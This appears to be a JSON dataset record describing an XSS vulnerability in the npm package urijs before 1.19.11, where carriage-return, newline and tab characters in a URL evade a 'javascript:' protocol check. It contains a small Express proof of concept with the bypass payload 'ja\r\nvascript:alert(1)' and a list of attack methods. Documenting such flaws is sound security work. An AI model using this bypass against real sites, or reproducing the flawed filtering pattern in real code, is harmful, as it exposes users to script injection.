{"description": "\\r, \\n and \\t characters in user-input URLs can potentially lead to incorrect protocol extraction when using npm package urijs prior to version 1.19.11.\n\nThis can lead to XSS when the module is used to prevent passing in malicious javascript: links into HTML or Javascript (see following example):\n````\nconst parse = require('urijs')\nconst express = require('express')\nconst app = express()\nconst port = 3000\n\ninput = \"ja\\r\\nvascript:alert(1)\"\nurl = parse(input)\n\nconsole.log(url)\n\napp.get('/', (req, res) => {\n if (url.protocol !== \"javascript:\") {res.send(\"<iframe src=\\'\" + input + \"\\'>CLICK ME!</iframe>\")}\n})\n\napp.listen(port, () => {\n console.log(`Example app listening on port ${port}`)\n})\n````", "methods": ["Used \\r, \\n, and \\t characters in user-input URLs to bypass protocol extraction in urijs prior to version 1.19.11.", "Injected malicious javascript: links into HTML or JavaScript to facilitate XSS attacks.", "Used a vulnerable module (urijs) to prevent passing in malicious javascript: links.", "Created a web server to serve malicious content using Express.js."]}